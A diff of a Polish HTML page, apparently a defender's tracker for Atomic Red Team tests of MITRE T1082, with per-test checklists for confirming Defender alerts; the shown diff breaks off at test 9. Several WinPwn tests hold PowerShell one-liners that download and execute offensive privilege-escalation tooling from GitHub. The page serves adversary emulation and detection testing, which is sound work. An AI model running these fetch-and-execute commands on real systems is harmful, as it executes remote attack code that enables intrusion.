@@ -2,39 +2,591 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8">
-  <title>Alert: System Information Discovery</title>
+  <title>Alert: System Information Discovery – Atomic Red Team</title>
   <style>
     body { font-family: Segoe UI, Arial, sans-serif; margin: 2rem; background: #f6f7fb; }
-    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 700px; margin: auto; }
+    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 800px; margin: auto; }
     h1 { margin-top: 0; font-size: 2rem; }
     .desc, .id, .link, .author, .tactic, .status { margin-bottom: 1.1em; }
     .meta { font-size: .95em; color: #555; margin-bottom: .8em; }
     .section { font-size: .99em; }
     .scenario-block { background: #f4f0d9; border-radius: 7px; padding: 1em 1.2em; margin-bottom: 1.2em; color:#4a4500; font-size:1.07em; border-left:5px solid #e1c553; }
-    pre { background: #eee; padding: .7em 1em; border-radius: 5px; }
+    pre { background: #eee; padding: .7em 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all; overflow-x: auto; max-width: 100%; }
     code { background: #f6f6f6; padding: 2px 5px; border-radius: 2px; }
     ul { margin-left: 1.6em; }
+    textarea { width:100%; border-radius:8px; border:1.5px solid #d6d6d6; font-size:1.08em; margin-top:8px; padding:8px; background:#faf8ed;}
+    .badge-ok { background: #43a047; color: #fff; }
+    .art-accordion { margin-bottom:10px; }
+    .art-accordion-btn { background:#eaf4ff; color:#1d3557; cursor:pointer; padding:9px 18px; width:100%; text-align:left; border:none; border-radius:7px; font-size:1.1em; font-weight:600; margin-bottom:2px; transition:background 0.18s;}
+    .art-accordion-btn:hover { background:#ddefff; }
+    .art-accordion-content { display:none; background:#f7fafd; border:1px solid #e3e3e3; border-radius:0 0 7px 7px; padding:13px 18px; margin-bottom:2px; }
+    .test-cleanup { background:#fffde7; border-left:4px solid #ffd700; margin-top:11px; padding:7px 12px; border-radius:5px; }
+    .badge { display:inline-block; border-radius:8px; padding:2px 10px; font-size:.94em; color:#fff; margin-right:7px; }
+    .badge-ps { background:#1976d2; }
+    .badge-cmd { background:#29b300; }
+    .badge-total { background:#888; }
+    .art-checklist { background: #f7fff7; border-radius:6px; margin-top:10px; padding:7px 15px; }
+    .art-checklist label { font-size:1.02em; margin-right:20px; }
+    .art-checklist input[type=checkbox] { transform: scale(1.2); margin-right:8px; }
+    .art-copy-btn { background:#fff; border:1px solid #bdbdbd; color:#1976d2; border-radius:6px; padding:3px 11px; margin-left:8px; font-size:0.97em; cursor:pointer;}
+    .art-copy-btn:active { background:#eaf4ff;}
+    .eksport-btn { background:#c5e1a5; color:#1b4b2b; border-radius:7px; border:none; padding:9px 17px; margin:11px 0 5px 0; font-weight:600; cursor:pointer; }
+    .eksport-btn:hover { background:#b2dfdb; }
+    .import-btn { background:#bbdefb; color:#1a237e; border-radius:7px; border:none; padding:8px 15px; margin-left:8px; font-weight:600; cursor:pointer; }
+    .import-btn:hover { background:#90caf9; }
   </style>
+  <script>
+    function toggleArtAccordion(btn) {
+      var content = btn.nextElementSibling;
+      content.style.display = (content.style.display === "block") ? "none" : "block";
+    }
+    function copyArtCode(btn) {
+      var code = btn.previousElementSibling.textContent;
+      navigator.clipboard.writeText(code);
+      btn.textContent = "Skopiowano!";
+      setTimeout(()=>btn.textContent="Kopiuj", 1100);
+    }
+    function saveChecklist(tid, id, scenarioBlockId, testLabel) {
+      var uniqueId = tid + '-' + id;
+      var div = document.getElementById('checklist-' + uniqueId);
+      var chks = div.querySelectorAll('input[type=checkbox]');
+      var states = Array.from(chks).map(x => x.checked);
+      localStorage.setItem('art-checklist-' + uniqueId, JSON.stringify(states));
+      var allChecked = states.every(x=>x);
+      document.getElementById('tested-badge-' + uniqueId).style.display = allChecked ? 'inline-block' : 'none';
+      if(allChecked && scenarioBlockId && testLabel) {
+        var now = new Date().toLocaleString("pl-PL");
+        var msg = `✅ [${now}] Przetestowano: ${testLabel} – utworzono alert w Defenderze`;
+        var scenario = document.getElementById(scenarioBlockId);
+        if(scenario && !scenario.value.includes(msg)) {
+          scenario.value += "\n" + msg;
+        }
+      }
+    }
+    function loadChecklist(tid, id, scenarioBlockId, testLabel) {
+      var uniqueId = tid + '-' + id;
+      var div = document.getElementById('checklist-' + uniqueId);
+      if (!div) return;
+      var chks = div.querySelectorAll('input[type=checkbox]');
+      var states = JSON.parse(localStorage.getItem('art-checklist-' + uniqueId) || '[]');
+      chks.forEach((chk, i) => { chk.checked = !!states[i]; });
+      var allChecked = states.length && states.every(x=>x);
+      document.getElementById('tested-badge-' + uniqueId).style.display = allChecked ? 'inline-block' : 'none';
+      if(allChecked && scenarioBlockId && testLabel) {
+        var now = new Date().toLocaleString("pl-PL");
+        var msg = `✅ [${now}] Przetestowano: ${testLabel} – utworzono alert w Defenderze`;
+        var scenario = document.getElementById(scenarioBlockId);
+        if(scenario && !scenario.value.includes(msg)) {
+          scenario.value += "\n" + msg;
+        }
+      }
+    }
+    function resetChecklist(tid, id, scenarioBlockId, testLabel) {
+      var uniqueId = tid + '-' + id;
+      localStorage.removeItem('art-checklist-' + uniqueId);
+      loadChecklist(tid, id, scenarioBlockId, testLabel);
+    }
+    function eksportujProgres(tid, total_tests) {
+      let out = [];
+      for(let i=1; i<=total_tests; i++) {
+        let id = 'art' + String(i).padStart(2,'0');
+        let uniqueId = tid + '-' + id;
+        let div = document.getElementById('checklist-' + uniqueId);
+        if(!div) continue;
+        let label = div.getAttribute('data-label') || ("Atomic Test " + i);
+        let chks = div.querySelectorAll('input[type=checkbox]');
+        let states = Array.from(chks).map(x => x.checked);
+        if(states.every(x=>x)) {
+          let now = new Date().toLocaleString("pl-PL");
+          out.push(`✅ [${now}] Przetestowano: ${label} – utworzono alert w Defenderze`);
+        }
+      }
+      let box = document.getElementById('eksportChecklist');
+      box.style.display = 'block';
+      box.value = out.join("\n");
+      box.select();
+      document.execCommand('copy');
+    }
+    function pokazImport() {
+      var el = document.getElementById('importBox');
+      el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+    }
+    function importujProgres() {
+      var lines = document.getElementById('importProgress').value.split('\n');
+      var tid = document.body.getAttribute('data-tid');
+      var total_tests = Number(document.body.getAttribute('data-total-tests')||'1');
+      for(let i=1; i<=total_tests; i++) {
+        let id = 'art' + String(i).padStart(2,'0');
+        let label = "";
+        let div = document.getElementById('checklist-' + tid + '-' + id);
+        if(!div) continue;
+        label = div.getAttribute('data-label') || ("Atomic Test " + i);
+        let ok = lines.some(line => line.includes(label));
+        if(ok) {
+          let chks = div.querySelectorAll('input[type=checkbox]');
+          let states = Array(chks.length).fill(true);
+          chks.forEach((chk, idx) => { chk.checked = true; });
+          localStorage.setItem('art-checklist-' + tid + '-' + id, JSON.stringify(states));
+          document.getElementById('tested-badge-' + tid + '-' + id).style.display = 'inline-block';
+        }
+      }
+      alert('Przywrócono progres!');
+      location.reload();
+    }
+    window.addEventListener('DOMContentLoaded', function() {
+      var tid = document.body.getAttribute('data-tid');
+      var total_tests = Number(document.body.getAttribute('data-total-tests')||'1');
+      for(let i=1; i<=total_tests; i++) {
+        let id = 'art' + String(i).padStart(2,'0');
+        let div = document.getElementById('checklist-' + tid + '-' + id);
+        if(!div) continue;
+        let scenarioBlockId = div.getAttribute('data-scenario');
+        let testLabel = div.getAttribute('data-label');
+        loadChecklist(tid, id, scenarioBlockId, testLabel);
+        div.querySelectorAll('input[type=checkbox]').forEach(function(chk) {
+          chk.onchange = function() { saveChecklist(tid, id, scenarioBlockId, testLabel); };
+        });
+      }
+    });
+  </script>
 </head>
-<body>
+<body data-tid="T1082" data-total-tests="28">
 <div class="card">
   <h1>Alert: System Information Discovery</h1>
-  <div class="meta"><b>Technique ID:</b> T1082<div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'><b>Atomic Red Team – dostępne testy dla tej techniki:</b><ul><li><b>System Information Discovery</b><br><b>Polecenia testowe (cmd):</b><pre>systeminfo
-reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum</pre><a href='../../scenarios/atomic_tests\T1082\System_Information_Discovery/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Hostname Discovery (Windows)</b><br><b>Polecenia testowe (cmd):</b><pre>hostname</pre><a href='../../scenarios/atomic_tests\T1082\Hostname_Discovery_(Windows)/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Windows MachineGUID Discovery</b><br><b>Polecenia testowe (cmd):</b><pre>REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid</pre><a href='../../scenarios/atomic_tests\T1082\Windows_MachineGUID_Discovery/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Griffon Recon</b><br><b>Polecenia testowe (powershell):</b><pre>cscript "#{vbscript}"</pre><a href='../../scenarios/atomic_tests\T1082\Griffon_Recon/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Environment variables discovery on windows</b><br><b>Polecenia testowe (cmd):</b><pre>set</pre><a href='../../scenarios/atomic_tests\T1082\Environment_variables_discovery_on_windo/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>WinPwn - winPEAS</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-winPEAS -noninteractive -consoleoutput</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_winPEAS/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - itm4nprivesc</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-itm4nprivesc -noninteractive -consoleoutput</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_itm4nprivesc/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - Powersploits privesc checks</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-oldchecks -noninteractive -consoleoutput</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_Powersploits_privesc_checks/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>rm -force -recurse .\DomainRecon -ErrorAction Ignore
+  <div class="meta"><b>Technique ID:</b> T1082</div>
+  <div class="tactic section"><b>Tactics:</b> Discovery</div>
+  <div class="status section"><b>Status:</b> ART / do walidacji</div>
+  <div class="desc section"><b>MITRE Description:</b><br>An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the &lt;code&gt;systemsetup&lt;/code&gt; configuration tool on macOS. As an example, adversaries with user-level access can execute the &lt;code&gt;df -aH&lt;/code&gt; command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. &lt;code&gt;show version&lt;/code&gt;).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get`, `system version get`, and `storage filesystem list` (to list storage volumes).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)  Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)  [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)</div>
+  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1082/" target="_blank">https://attack.mitre.org/techniques/T1082/</a></div>
+  <div class="scenario-block">
+    <b>Twój opis scenariusza:</b><br>
+    <textarea id="scenarioBlock" rows="7" readonly>
+Tutaj wpisz opis scenariusza lub eksportuj progres z checklisty poniżej.
+    </textarea>
+  </div>
+  <button onclick="eksportujProgres('T1082',28)" class="eksport-btn">Eksportuj progres (do MD)</button>
+  <button onclick="pokazImport()" class="import-btn">Załaduj progres z .md</button>
+  <div id="importBox" style="display:none;margin-top:8px;">
+    <textarea id="importProgress" rows="4" style="width:99%;"></textarea>
+    <button onclick="importujProgres()" class="import-btn">Zastosuj progres</button>
+  </div>
+  <textarea id="eksportChecklist" rows="4" style="width:100%;margin-top:10px;display:none;"></textarea>
+  <div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'>
+    <b>Atomic Red Team – dostępne testy dla tej techniki:</b>
+    <div style="margin-bottom:10px;">
+      <span class="badge badge-total">28 testów</span>
+      <span class="badge badge-ps">12 PowerShell</span>
+      <span class="badge badge-cmd">16 CMD</span>
+      <a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1082' target='_blank' style="float:right;">Zobacz na GitHubie</a>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 1: System Information Discovery</b>
+        <span id="tested-badge-T1082-art01" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>systeminfo
+reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\System_Information_Discovery\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art01" data-scenario="scenarioBlock" data-label="Atomic Test 1: System Information Discovery">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art01','scenarioBlock','Atomic Test 1: System Information Discovery')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 2: Hostname Discovery (Windows)</b>
+        <span id="tested-badge-T1082-art02" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>hostname</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Hostname_Discovery_(Windows)\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art02" data-scenario="scenarioBlock" data-label="Atomic Test 2: Hostname Discovery (Windows)">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art02','scenarioBlock','Atomic Test 2: Hostname Discovery (Windows)')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 3: Windows MachineGUID Discovery</b>
+        <span id="tested-badge-T1082-art03" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Windows_MachineGUID_Discovery\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art03" data-scenario="scenarioBlock" data-label="Atomic Test 3: Windows MachineGUID Discovery">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art03','scenarioBlock','Atomic Test 3: Windows MachineGUID Discovery')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 4: Griffon Recon</b>
+        <span id="tested-badge-T1082-art04" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>cscript &quot;#{vbscript}&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Griffon_Recon\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art04" data-scenario="scenarioBlock" data-label="Atomic Test 4: Griffon Recon">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art04','scenarioBlock','Atomic Test 4: Griffon Recon')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 5: Environment variables discovery on windows</b>
+        <span id="tested-badge-T1082-art05" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>set</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Environment_variables_discovery_on_windo\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art05" data-scenario="scenarioBlock" data-label="Atomic Test 5: Environment variables discovery on windows">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art05','scenarioBlock','Atomic Test 5: Environment variables discovery on windows')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 6: WinPwn - winPEAS</b>
+        <span id="tested-badge-T1082-art06" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+winPEAS -noninteractive -consoleoutput</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_winPEAS\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art06" data-scenario="scenarioBlock" data-label="Atomic Test 6: WinPwn - winPEAS">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art06','scenarioBlock','Atomic Test 6: WinPwn - winPEAS')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 7: WinPwn - itm4nprivesc</b>
+        <span id="tested-badge-T1082-art07" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+itm4nprivesc -noninteractive -consoleoutput</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_itm4nprivesc\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art07" data-scenario="scenarioBlock" data-label="Atomic Test 7: WinPwn - itm4nprivesc">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art07','scenarioBlock','Atomic Test 7: WinPwn - itm4nprivesc')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 8: WinPwn - Powersploits privesc checks</b>
+        <span id="tested-badge-T1082-art08" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+oldchecks -noninteractive -consoleoutput</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_Powersploits_privesc_checks\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="test-cleanup">
+          <b>Cleanup (powershell):</b>
+          <pre>rm -force -recurse .\DomainRecon -ErrorAction Ignore
 rm -force -recurse .\Exploitation -ErrorAction Ignore
 rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
 rm -force -recurse .\LocalRecon -ErrorAction Ignore
-rm -force -recurse .\Vulnerabilities -ErrorAction Ignore</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_Powersploits_privesc_checks/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>WinPwn - General privesc checks</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-otherchecks -noninteractive -consoleoutput</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_General_privesc_checks/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - GeneralRecon</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-Generalrecon -consoleoutput -noninteractive</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_GeneralRecon/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - Morerecon</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-Morerecon -noninteractive -consoleoutput</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_Morerecon/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - RBCD-Check</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-RBCD-Check -consoleoutput -noninteractive</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_RBCD-Check/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - PowerSharpPack - Watson searching for missing windows patches</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
-Invoke-watson</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Watson_searchi/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
-Invoke-SharpUp -command "audit"</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Sharpup_checki/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>WinPwn - PowerSharpPack - Seatbelt</b><br><b>Polecenia testowe (powershell):</b><pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
-Invoke-Seatbelt -Command "-group=all"</pre><a href='../../scenarios/atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Seatbelt/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>System Information Discovery with WMIC</b><br><b>Polecenia testowe (cmd):</b><pre>wmic cpu get name
+rm -force -recurse .\Vulnerabilities -ErrorAction Ignore</pre>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_Powersploits_privesc_checks\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art08" data-scenario="scenarioBlock" data-label="Atomic Test 8: WinPwn - Powersploits privesc checks">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art08','scenarioBlock','Atomic Test 8: WinPwn - Powersploits privesc checks')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 9: WinPwn - General privesc checks</b>
+        <span id="tested-badge-T1082-art09" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+otherchecks -noninteractive -consoleoutput</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_General_privesc_checks\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art09" data-scenario="scenarioBlock" data-label="Atomic Test 9: WinPwn - General privesc checks">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art09','scenarioBlock','Atomic Test 9: WinPwn - General privesc checks')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
